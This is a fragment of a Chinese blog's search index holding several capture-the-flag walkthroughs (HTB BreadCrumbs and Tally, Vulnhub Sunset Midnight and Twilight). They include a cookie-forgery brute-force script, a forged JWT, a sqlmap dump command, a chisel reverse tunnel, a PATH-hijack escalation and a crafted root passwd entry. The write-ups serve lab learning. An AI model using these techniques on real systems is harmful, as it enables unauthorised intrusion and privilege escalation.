src=\"/vulnhub_img/WEBRESOURCE8bf37b242e62ef6b76bfc2232d2e165c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x035 sunset decoy"},{"content":"端口扫描 获取立足点 值得注意的服务：ssh\\http\\smb\\mysql\nsmb：\nhttp:\n看起来是个搜索框，可能是sql注入？\nfuzz好像没有：\n目录扫描，发现登录框：\n发现很多用户名：\n似乎是存放cookie的地方：\n同时发现，疑似文件包含：\n根据报错，看样子是有了：\n成功读取cookie.php:\n查看login.php的源码：\n似乎authController.php才是负责身份控制的：\n发现数据文件：\n发现账号密码：\n但是不允许登录：\n看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：\n读取它：\n简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：\n返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：\n这里面只需要提供账号名，我们就可以伪造了：\n结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：\n代码如下：\nimport hashlib\rimport random\rdef makesession(username):\rmax_index = len(username) - 1\rseed = random.randint(0, max_index)\rkey = \u0026#34;s4lTy_stR1nG_\u0026#34; + username[seed] + \u0026#34;(!528./9890\u0026#34;\rsession_cookie = username + hashlib.md5(key.encode()).hexdigest()\rreturn session_cookie\r# 测试示例\rusername = \u0026#34;paul\u0026#34;\rsession_cookie = makesession(username)\rprint(\u0026#34;Generated Session Cookie:\u0026#34;, session_cookie) 生成是生成了，但是无法操作成功：\n换成别人的成功了：\nfrom requests import get\rfrom hashlib import md5\rusername = \u0026#34;paul\u0026#34;\rfor i in username:\rkey = \u0026#34;s4lTy_stR1nG_\u0026#34; + i + \u0026#34;(!528./9890\u0026#34;\rsessid = username + md5(key.encode()).hexdigest()\rcookie = { \u0026#34;PHPSESSID\u0026#34; : sessid }\rresp = get(\u0026#34;http://10.10.10.228/portal/php/files.php\u0026#34;, cookies=cookie,\rallow_redirects=False)\rif resp.status_code != 302:\rprint(f\u0026#34;Valid session ID: {sessid}\u0026#34;) 替换成功后就成功看到了文件管理功能：\n但是提示权限不足：\n看来是之前就看到了的jwt的问题了，但是jwt的key，我们是可以看到的，就可以伪造：\n6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\n伪造出来为：\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU\n看样子是哪里报错了？\n好像是有拦截：\nsmbserver好像失败了：\n那就nishang powershell：\n妈的，服了，还有检测，拦截了\n提权 这里的思路，大概如下：\n1、登录mysql\n2、信息收集\n先看第一个把：\n这个功能要实现，需要端口转发：\nkali执行：\n./chisel server -p 6666 \u0026ndash;reverse\nwindows执行：\n./chisel.exe client -v 10.10.16.5:6666 R:0.0.0.0:1234:127.0.0.1:1234\n这样，windows的3306就映射到了kali的8888端口：\n发现密码hash：\n但是爆破不出来：\n呐只能接着看了：\n最后在这里发现密码：\n通过ssh直接登录：\n上winpeass:\n好像不给运行：\n其实web是有权限下载和运行的，但是之前看了一眼systeminfo，感觉也没那么容易，继续信息收集把，刚刚的桌面上有一个文件：\n有一些有趣的信息：\n未授权？\n密码管理？\nMicrosoft Store Sticky Notes是便签，他说在进行中，网上进行搜索，发现可以恢复：\nhttps://blog.csdn.net/sinat_40801052/article/details/123448412\n把文件传输到kali:\n双击打开即可：\ndevelopment: fN3)sN5Ee@g\n登录成功：\n发现信息：\n好像是个解密的程序：\n应该是可以获得administrator的密码：\n但是得逆向，通过strings的信息：\nRequesting decryption key from cloud\u0026hellip;\nAccount: Administrator\nhttp://passmanager.htb:1234/index.php\nmethod=select\u0026amp;username=administrator\u0026amp;table=passwords\n在主机上查看也可以看到1234端口开放\n再次转发出来：\n使用curl模拟发包：\ncurl http://passmanager.htb:1234/index.php -d \u0026lsquo;method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026rsquo;\n获得aeskey:k19D193j.\u0026lt;19391(\n那么这里其实很容易想到sql注入，其实也是web页面嘛：\n查库名：\n查表名：\n查列名：\n查数据：\n拿到加密的密码和aes_key了，没有偏移量，在线解密即可：\np@ssw0rd!@#$9890./\n总结 这台靶机巨烫手，从开始的web渗透开始，到最后的提权。\nweb渗透的核心是文件包含+代码审计，算是常规考点，但是代码熟悉程度确实是个难点，不是很容易可以写出session的脚本，幸好还有jwt的知识基础，还算容易的绕过。\n随后是文件上传，上传需要进行一些修改，否则会被干，以及反弹shell，nishang的脚本也会被干，需要稍微修改一下代码。\n中间走了弯路，mysql5的hash加密方式，没有爆出来，随后是信息收集，成功获得第一个合法用户密码。\n桌面的工作进程文件，提示存在微软便签，里面存放了明文密码，但是已经被删除，后面通过查询资料，恢复密码，kali可以直接解析，查看即可，获得第二个合法用户密码。\n最后是C盘目录下的非常规目录，找到一个Linux程序，通过strings简单的逆向，可以发现一个web服务，但是仅在127.0.0.1地址开放，需要进行端口转发，通过转发出来，发现该服务是给程序来进行aes_key查询的，通过该方式有很明显的查询痕迹，通过sql注入，成功获取到了aes加密的密码，通过aes_key来解密该密码，即可获得administrator的密码。\n总体来说，这个靶机考点很多，包括：文件包含、代码审计、端口转发、简单免杀绕过、简单逆向、JWT、SQL注入、AES加密算法，一定的脚本编写能力\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE70be77fb5ef93b8149102fb00a072d05image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe8715c473c00666e0051e4bfffdde548image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE29b677e2297d8725770835b3ff84dbf4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf06af7d090a1110fa2f7e891703eac51image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得注意的服务：ssh\\http\\smb\\mysql\u003c/p\u003e\n\u003cp\u003esmb：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE577cd4ade8a9a13d84ae8618db0b8d31image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ehttp:\u003c/p\u003e\n\u003cp\u003e看起来是个搜索框，可能是sql注入？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc5ccae5df7ad67cbdbab90c92ab5d5c9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003efuzz好像没有：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdc4a1d68693754c002aed4f20f59380eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e目录扫描，发现登录框：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE88a7af724c1f43258f48b344870d803cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现很多用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE611c4eb350390e4fbe8373abe6846b4cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e似乎是存放cookie的地方：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE79915e476c56fdc93a82e5f7e8c588b7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时发现，疑似文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb358716131321cf3f726119aac887f51image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e根据报错，看样子是有了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4c50303b32179b578469e85d451c9bffimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e成功读取cookie.php:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7bd0675c4fd79d436654812ca19e2971image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看login.php的源码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe2d9dc38b25f889b59062562bab56330image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e似乎authController.php才是负责身份控制的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE378001e303caa274ed5fed50c7783e12image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现数据文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2903756de18100cc7ab83d37d08408bdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2858bb6f9846a0f08a70ca842e07602dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是不允许登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE75f311313cc9cf369f8e48733673959bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4122ba0229a6bb89cb50f80c35c0c010image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e读取它：\u003c/p\u003e\n\u003cp\u003e简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4d23778e62cf8f06a5217cbe1a974503image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：\u003c/p\u003e\n\u003cp\u003e这里面只需要提供账号名，我们就可以伪造了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE910293850c731e21055e0e151283ddb6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE17b9646a16d87a4a2c5ca7a89b2a938fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e代码如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimport hashlib\r\nimport random\r\n\r\ndef makesession(username):\r\n    max_index = len(username) - 1\r\n    seed = random.randint(0, max_index)\r\n    key = \u0026#34;s4lTy_stR1nG_\u0026#34; + username[seed] + \u0026#34;(!528./9890\u0026#34;\r\n    session_cookie = username + hashlib.md5(key.encode()).hexdigest()\r\n\r\n    return session_cookie\r\n\r\n# 测试示例\r\nusername = \u0026#34;paul\u0026#34;\r\nsession_cookie = makesession(username)\r\nprint(\u0026#34;Generated Session Cookie:\u0026#34;, session_cookie)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7b9afb35c9b08cf526a1edc1e62bc361image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X036 BreadCrumbs"},{"content":"开机改网卡\n端口扫描 渗透测试 修改hosts\n又是一个wordpress：\nwpscan扫描一下：\n用户名admin\n插件：\n--enumerate 通过查询Simply Poll的历史漏洞发现sql注入：\nsqlmap -u \u0026#34;http://sunset-midnight/wp-admin/admin-ajax.php\u0026#34; --data=\u0026#34;action=spAjaxResults\u0026amp;pollid=2\u0026#34; --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump 虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：\n找了半天hash生成工具，找到这个网站了\nhttps://www.useotools.com/wordpress-password-hash-generator/output\n但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表\n破解\nroot/robert\nssh连接失败：\n还有一个端口3306：\n连接成功：\n再次修改密码：\n进入wordpress后台：\n这次是修改插件getshell:\n提权 麻了，看样子还是得破解那个hash:\n这边先跑着，然后翻一下敏感文件：\n好使：\n/** MySQL database username */\ndefine( \u0026lsquo;DB_USER\u0026rsquo;, \u0026lsquo;jose\u0026rsquo; );\n/** MySQL database password */\ndefine( \u0026lsquo;DB_PASSWORD\u0026rsquo;, \u0026lsquo;645dc5a8871d2a4269d4cbe23f6ae103\u0026rsquo; );\nuser.txt:\nSUID提权\n修改环境变量：\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; service\rchmod 777 service\rexport PATH=/tmp:$PATH\rstatus 这里有几个疑问：这里的SUID是非常规的命令，GTFOBins并不能给出好的提权建议，看很多WP都是一笔带过，就说这个可疑，那么这个可疑的判断是只能看经验吗，还是有什么技巧，还是只能挨个看。\n这个问题随着对靶场和系统的熟悉会得到解决，前期靠挨个看，后期凭经验。\n然后是这个命令，我倒是知道是service ssh status的结果，但是这里又怎么看出来脚本没有使用service命令的绝对路径，导致可以修改环境变量来提权。\n针对这个疑问，可以使用strings命令读取status的可识别字符串，就可以解答了。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/","summary":"\u003cp\u003e开机改网卡\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE515c39a3dcd4fcc5ce0480c323d5ffdd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe25f0457757bbefae5bfd634c289321b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb2710c79e4f6c9659dfad6e683bf179f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e修改hosts\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9416f3c413dc69ca81bb6da38cb50b53%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e又是一个wordpress：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc745f8202c3dbe9ee7c7247705308f13%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan扫描一下：\u003c/p\u003e\n\u003cp\u003e用户名admin\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9510f37f7c02bcd4a296d91df829154f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e插件：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e--enumerate\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc7dca05db1ab1a43e4703a6874d66850%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过查询Simply Poll的历史漏洞发现sql注入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE51825315e324319d8346b1b8c18c9a0d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE848c7a2d74488032fec7fb2914a8da18%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esqlmap -u \u0026#34;http://sunset-midnight/wp-admin/admin-ajax.php\u0026#34; --data=\u0026#34;action=spAjaxResults\u0026amp;pollid=2\u0026#34; --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcee05cc4df5bc1ee05e20f953efe1863%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：\u003c/p\u003e\n\u003cp\u003e找了半天hash生成工具，找到这个网站了\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.useotools.com/wordpress-password-hash-generator/output\"\u003ehttps://www.useotools.com/wordpress-password-hash-generator/output\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcf45a329b9b9f084054046b680c0d714%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe9741833b28b831db0975a086e66aae7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEac1df8d7902946381479d04729d86e47%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2ac5d6bd7c5cd8d5c0df79e71a4d4e55%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解\u003c/p\u003e\n\u003cp\u003eroot/robert\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0f0829e50053a3c8368b33e58540f079%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003essh连接失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE67d04ecc7aec34c3c8998e5aba5369c5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e还有一个端口3306：\u003c/p\u003e\n\u003cp\u003e连接成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE687afab837885aabd4de5814df67218c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再次修改密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0bec078c9a9cba3a798281ce70fdcf68%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x036 sunset midnight "},{"content":"端口扫描 渗透 21匿名登录失败：\nmysql无密码直接登录成功，翻查敏感信息：\n不允许写入：\n数据库也没有其他信息了，暂时先放一下，看一下smb，疑似根目录：\n挂载下来，慢慢看：\n用户名：miguel\n翻查敏感目录，发现web目录存在写入权限：\n反弹shell:\n提权 跑完一圈脚本后，咋感觉提权点有点多呢：\n这个密码看起来是破解出来了，咋用不了呢：\n算了，用openssl生成一个passwd的密码，然后修改passwd文件，就可以提权了：\nroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash 密码Abcd1234\n邪门儿，我咋先拿了root再拿的用户权限呢，我去看看其他人咋做的\n其他人是web渗透拿到的，但是好像也没去拿用户权限\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x037-sunset-twilight/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE27f14d745b2f0e154015f2be58cf76f5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4c8e41b066c0f14495d135172bef00b8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEce027da8b90fba789bc868b2012e5a20%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21匿名登录失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5dafc474980e02adf7619137190fd50a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emysql无密码直接登录成功，翻查敏感信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf2ee80d54fdc3dbbaa97963964ae99e1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不允许写入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6a8c5f13fef2d9beb6db5a94bd9b5993%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e数据库也没有其他信息了，暂时先放一下，看一下smb，疑似根目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa9d0876f74b9b7eaf03897df23f9975a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挂载下来，慢慢看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b78d0f155f7a79208a0410057de6fe4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名：miguel\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE890831d187809ac88f6afee9593be6cb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e翻查敏感目录，发现web目录存在写入权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf87333824f34208bdf6868fdb3c6fe1f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEba201ad6ab6d29cccb526ea14d823f3c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb654ec6d76b7f6148d18325a63e3fbed%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5680adbf5993927db6df3f7bec5129e4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6890ad4950dfe525259db6d1e213e0cb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE251105d444290b22cfac1af86f62116e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e跑完一圈脚本后，咋感觉提权点有点多呢：\u003c/p\u003e\n\u003cp\u003e这个密码看起来是破解出来了，咋用不了呢：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE230c38b38c06ef41ce9e30bbda642143%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e算了，用openssl生成一个passwd的密码，然后修改passwd文件，就可以提权了：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e密码Abcd1234\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3bdda34dbb832e5886736c5f9a5e8e08%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEefaa079a7e85e4784a717f16b8e6a634%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb297ae3985c5f010566a23128e848a6d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e邪门儿，我咋先拿了root再拿的用户权限呢，我去看看其他人咋做的\u003c/p\u003e\n\u003cp\u003e其他人是web渗透拿到的，但是好像也没去拿用户权限\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7a716d079a4ee49b77241618fb04e6d8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x037 Sunset Twilight"},{"content":"端口扫描 获取立足点 值得关注的服务：\nftp、http、smb、mysql、winrm\n先看ftp:\nsmb：\n只能看看http了：\n我扫了半天也没扫出东西来，看了才知道，得用其他字典:\n/usr/share/wordlists/dirb/vulns/sharepoint.txt\n这三个都可以用：\n发现文档：\n有密码了，但是好像没名字\n先试试，但是失败了，继续信息收集，通过删除#号前面的内容，可以成功看到信息：\n用户名为：ftp_user，同时告诉我们一个信息，他们会定时查看htlm文件，在Intranet文件夹中，可能可以钓鱼：\n发现用户名：\n继续信息收集，发现一个keepass软件：\n这个软件好像是个密码保存软件：\n并且查询后发现存储的密码是可以破解的：\nsimplementeyo (tim)\n通过keepass2读取文件：\nwinrm登录失败了，但是成功登录了smb，说实话，东西太多了，这样增加的难度我不是很喜欢：\n在zz_Archived中发现密码：\n但是好像不对：\n在zz_Migration文件夹下面发现程序：\n通过strings读取，发现新的账号密码：\nUID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;\n登录成功：\n可以使用xp_cmd执行命令：\n反弹shell:\n使用nishang反弹：\n提权 上winpeass：\n可以尝试内核提权：\n烂土豆提权：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x038-tally/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2e65f32af6430600375a0f308e85fe70image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5bc4aae6d24dbfb004aca4c9548c9cecimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1e113e5e44899274a4b48480d7e76007image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5e37c1a6db88c53a1ace675970cd5b08image.png\" 